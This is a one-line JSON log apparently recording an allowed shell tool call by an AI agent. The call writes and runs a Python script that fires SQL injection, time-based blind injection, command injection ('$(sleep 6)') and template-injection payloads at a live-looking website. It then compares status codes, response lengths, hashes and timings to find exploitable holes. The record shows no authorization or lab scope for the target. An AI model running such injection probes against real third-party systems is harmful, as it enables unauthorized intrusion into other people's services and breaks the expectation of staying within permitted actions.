{"ts": 1790752377.70789, "decision_id": "2d815086c14b", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > w17/diff2.py <<'EOF'\nimport subprocess,re,hashlib,time,urllib.parse,statistics\nBASE=\"https://www.infinitycapital.bh/404\"\ndef norm(b):\n    s=b.decode('utf8','replace')\n    s=re.sub(r'bom[0-9a-z]*::[a-z0-9]+-[A-Za-z0-9-]+-db[0-9a-z]+','REQID',s)\n    s=re.sub(r'\"[A-Za-z0-9_-]{40,}\"','TOKEN',s)\n    return s\ndef get(v):\n    u=f\"{BASE}?q={urllib.parse.quote(v,safe='')}\"\n    p=subprocess.run(['curl','-sk','-m','30','-w','\\n%{http_code}',u],capture_output=True)\n    out=p.stdout\n    body,_,code=out.rpartition(b'\\n')\n    return code.decode(),norm(body)\ncases=[('baseline','1'),('quote',\"1'\"),('and_true',\"1 AND 1=1\"),('and_false',\"1 AND 1=2\"),\n       ('or_true',\"1 OR 1=1\"),('or_false',\"1 OR 1=2\"),('union',\"1 UNION SELECT 1,2,3\"),\n       ('sleep6',\"1 AND SLEEP(6)\"),('pgsleep6',\"1;SELECT pg_sleep(6)\"),\n       ('cmdi_dollar',\"$(sleep 6)\"),('cmdi_semi',\"1;sleep 6\"),('ssti',\"{{7*7}}\"),\n       ('marker','ICMARK9X')]\nfor k,v in cases:\n    ls=[];hs=set();cs=set();tms=[]\n    for _ in range(3):\n        t=time.time(); c,b=get(v); tms.append(time.time()-t)\n        ls.append(len(b)); hs.add(hashlib.md5(b.encode()).hexdigest()[:8]); cs.add(c)\n        time.sleep(1.2)\n    print(f\"{k:12s} codes={cs} len={min(ls)}-{max(ls)} med_t={statistics.median(tms):.2f} hashes={sorted(hs)}\")\nEOF\npython3 w17/diff2.py 2>&1 | tail -20"}
